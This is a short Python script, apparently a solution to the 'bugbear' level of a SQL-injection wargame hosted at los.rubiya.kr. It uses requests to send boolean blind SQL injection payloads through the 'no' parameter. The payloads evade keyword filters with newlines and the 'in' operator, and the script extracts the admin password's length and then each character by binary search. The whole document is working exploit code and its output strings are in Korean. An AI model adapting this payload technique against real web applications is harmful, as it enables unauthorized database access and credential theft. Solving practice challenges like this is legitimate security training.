import requests

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookie = {'PHPSESSID': 'cookie'}

def find_length():
    pwlength = 1

    while True:
        param = {"no": '1||id\nin\n("admin")&&length(pw)\nin\n("{}")#'.format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        if "Hello admin" in req.text:
            return pwlength
        else:
            pwlength += 1

def find_pw():
    length = find_length()
    print("비밀번호 길이: ", length)
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"no": '1||id\nin\n("admin")&&hex(mid(pw,{},1))\nin\n(hex({}))#'.format(i+1, value)}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
            else:
                param = {"no": '1||id\nin\n("admin")&&hex(mid(pw,{},1))>hex({})#'.format(i+1, value)}
                req = requests.get(url, params = param, cookies = cookie)
                if "Hello admin" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
    print("비밀번호는: ", password)

find_pw()